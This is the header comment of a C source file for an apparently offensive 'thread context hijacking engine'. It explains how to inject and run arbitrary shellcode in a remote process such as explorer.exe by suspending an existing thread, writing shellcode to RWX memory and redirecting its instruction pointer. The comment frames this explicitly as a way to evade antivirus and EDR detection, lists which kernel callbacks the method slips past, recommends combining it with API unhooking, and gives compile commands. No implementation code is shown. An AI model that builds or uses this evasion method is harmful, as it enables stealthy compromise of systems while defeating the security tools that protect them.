/*
 * thread_hijack.c — JOCKY Thread Context Hijacking Engine
 * ─────────────────────────────────────────────────────────
 * Executes arbitrary shellcode inside a remote process by hijacking an
 * EXISTING thread — no CreateThread, no CreateRemoteThread call ever made.
 *
 * WHY THREAD CREATION IS DANGEROUS (for AV evasion):
 * ──────────────────────────────────────────────────────
 *   CreateRemoteThread()
 *     → Triggers PsSetCreateThreadNotifyRoutine callback in kernel
 *     → EDR's kernel driver sees: "new thread in foreign process"
 *     → Instant alert / block
 *
 *   NtCreateThreadEx() (even direct syscall)
 *     → Still creates a thread object in kernel
 *     → ObRegisterCallbacks on thread objects catches it
 *
 * THREAD HIJACKING BYPASS:
 * ─────────────────────────
 *   1. Open a handle to the TARGET PROCESS (e.g. explorer.exe).
 *   2. Enumerate its existing threads — pick a suitable idle one.
 *   3. SUSPEND that thread (it's already existing — no new thread created).
 *   4. Read its current CONTEXT (register state + instruction pointer).
 *   5. Save the original RIP (so we can restore execution later).
 *   6. Allocate RWX memory in the target process.
 *   7. Write our shellcode + a trampoline (to restore original RIP) there.
 *   8. Redirect the thread's RIP to our shellcode.
 *   9. RESUME the thread — it now executes our code instead of its own.
 *  10. Our shellcode runs, then jumps to the saved original RIP.
 *  11. The thread resumes as if nothing happened — no crash, no detection.
 *
 * AV BYPASS ANALYSIS:
 * ─────────────────────
 *   ✓  No CreateThread / CreateRemoteThread call
 *   ✓  No new thread object created  → PsSetCreateThreadNotifyRoutine silent
 *   ✓  Only SuspendThread / ResumeThread on existing thread → routine ops
 *   ✓  Thread count stays the same  → thread-count anomaly detection fails
 *   ✓  Combine with API unhooking   → SuspendThread/ResumeThread hooks removed
 *
 * REFERENCE:
 *   "Thread Execution Hijacking" — MITRE ATT&CK T1055.003
 *   https://attack.mitre.org/techniques/T1055/003/
 *
 * COMPILE:
 *   cl /nologo /O2 /W3 thread_hijack.c /link /out:hijack.exe
 *   gcc -O2 -o hijack thread_hijack.c -lpsapi
 *
 * WARNING: For authorized forensic/research use only.
 */

